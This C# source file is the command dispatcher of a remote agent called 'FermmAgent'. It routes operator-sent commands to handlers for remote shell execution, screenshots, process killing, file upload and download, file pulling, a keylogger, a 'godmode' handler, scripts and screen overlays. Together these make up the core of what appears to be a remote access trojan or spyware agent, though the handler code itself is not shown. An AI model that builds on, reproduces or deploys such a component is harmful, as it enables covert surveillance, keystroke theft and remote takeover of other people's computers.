using FermmAgent.Handlers;
using FermmAgent.Models;

namespace FermmAgent;

public class CommandDispatcher
{
    private readonly ILogger<CommandDispatcher> _logger;
    private readonly AgentConfig _config;
    private readonly ShellHandler _shellHandler;
    private readonly ScreenshotHandler _screenshotHandler;
    private readonly ProcessHandler _processHandler;
    private readonly FileHandler _fileHandler;
    private readonly SysInfoHandler _sysInfoHandler;
    private readonly KeyloggerHandler _keyloggerHandler;
    private readonly GodModeHandler _godModeHandler;
    private readonly ScriptHandler _scriptHandler;
    private readonly FilePullHandler _filePullHandler;
    private readonly OverlayHandler _overlayHandler;

    public event Func<CommandResult, Task>? OnResult;
    public event Func<string, string, Task>? OnStreamLine; // commandId, line

    public CommandDispatcher(
        ILogger<CommandDispatcher> logger,
        AgentConfig config,
        ShellHandler shellHandler,
        ScreenshotHandler screenshotHandler,
        ProcessHandler processHandler,
        FileHandler fileHandler,
        SysInfoHandler sysInfoHandler,
        KeyloggerHandler keyloggerHandler,
        GodModeHandler godModeHandler,
        ScriptHandler scriptHandler,
        FilePullHandler filePullHandler,
        OverlayHandler overlayHandler)
    {
        _logger = logger;
        _config = config;
        _shellHandler = shellHandler;
        _screenshotHandler = screenshotHandler;
        _processHandler = processHandler;
        _fileHandler = fileHandler;
        _sysInfoHandler = sysInfoHandler;
        _keyloggerHandler = keyloggerHandler;
        _godModeHandler = godModeHandler;
        _scriptHandler = scriptHandler;
        _filePullHandler = filePullHandler;
        _overlayHandler = overlayHandler;
    }

    public async Task<CommandResult> HandleCommandAsync(AgentCommand cmd, CancellationToken ct)
    {
        _logger.LogInformation("Handling command {CommandId} of type {Type}", cmd.CommandId, cmd.Type);
        var sw = System.Diagnostics.Stopwatch.StartNew();
        
        try
        {
            CommandResult result;
            
            if (cmd.Type.Equals("overlay", StringComparison.OrdinalIgnoreCase))
            {
                result = await _overlayHandler.HandleAsync(cmd, ct);
            }
            else
            {
                var (exitCode, output, error) = cmd.Type.ToLower() switch
                {
                    "shell" => await _shellHandler.ExecuteAsync(cmd.Payload ?? "", OnStreamLine != null 
                        ? line => OnStreamLine(cmd.CommandId, line) 
                        : null, ct),
                    "screenshot" => await _screenshotHandler.CaptureAsync(ct),
                    "processes" => await _processHandler.ListAsync(ct),
                    "kill" => await _processHandler.KillAsync(int.Parse(cmd.Payload ?? "0"), ct),
                    "file" or "ls" => await HandleFileCommand(cmd.Payload ?? "{}", ct),
                    "upload" => await _fileHandler.WriteFileAsync(cmd.Payload ?? "", ct),
                    "download" => await _fileHandler.ReadFileAsync(cmd.Payload ?? "", ct),
                    "sysinfo" => await _sysInfoHandler.CollectAsync(ct),
                    "keylogger" => await _keyloggerHandler.HandleAsync(cmd.Payload ?? "status", ct),
                    "godmode" => await _godModeHandler.ExecuteAsync(cmd.Payload ?? "{\"action\":\"status\"}", ct),
                    "script" => await _scriptHandler.ExecuteAsync(cmd.Payload ?? "{}", ct),
                    "pull" => await _filePullHandler.ExecuteAsync(cmd.Payload ?? "{}", ct),
                    "ping" => (0, new List<string> { "pong" }, null),
                    _ => (-1, new List<string>(), $"Unknown command type: {cmd.Type}")
                };
                
                result = new CommandResult(
                    CommandId: cmd.CommandId,
                    DeviceId: _config.DeviceId,
                    Type: cmd.Type,
                    ExitCode: exitCode,
                    Output: output,
                    Error: error,
                    DurationMs: sw.ElapsedMilliseconds,
                    Timestamp: DateTime.UtcNow
                );
            }
            
            sw.Stop();
            result = result with { DurationMs = sw.ElapsedMilliseconds };
            
            if (OnResult != null)
                await OnResult(result);
            
            return result;
        }
        catch (Exception ex)
        {
            sw.Stop();
            _logger.LogError(ex, "Command {CommandId} failed", cmd.CommandId);
            
            var result = new CommandResult(
                CommandId: cmd.CommandId,
                DeviceId: _config.DeviceId,
                Type: cmd.Type,
                ExitCode: -1,
                Output: new List<string>(),
                Error: ex.Message,
                DurationMs: sw.ElapsedMilliseconds,
                Timestamp: DateTime.UtcNow
            );
            
            if (OnResult != null)
                await OnResult(result);
            
            return result;
        }
    }
    
    private async Task<(int ExitCode, List<string> Output, string? Error)> HandleFileCommand(string payload, CancellationToken ct)
    {
        try
        {
            var jsonDoc = System.Text.Json.JsonDocument.Parse(payload);
            var root = jsonDoc.RootElement;
            
            if (!root.TryGetProperty("action", out var actionElement))
            {
                return (-1, new List<string>(), "Missing 'action' in file command payload");
            }
            
            var action = actionElement.GetString();
            var path = root.TryGetProperty("path", out var pathElement) ? pathElement.GetString() ?? "." : ".";
            
            return action?.ToLower() switch
            {
                "ls" => await _fileHandler.ListDirAsync(path, ct),
                "upload" => await _fileHandler.WriteFileAsync(payload, ct),
                "download" => await _fileHandler.ReadFileAsync(path, ct),
                _ => (-1, new List<string>(), $"Unknown file action: {action}")
            };
        }
        catch (System.Text.Json.JsonException)
        {
            // If not valid JSON, treat as simple path for backward compatibility
            return await _fileHandler.ListDirAsync(payload, ct);
        }
    }
}
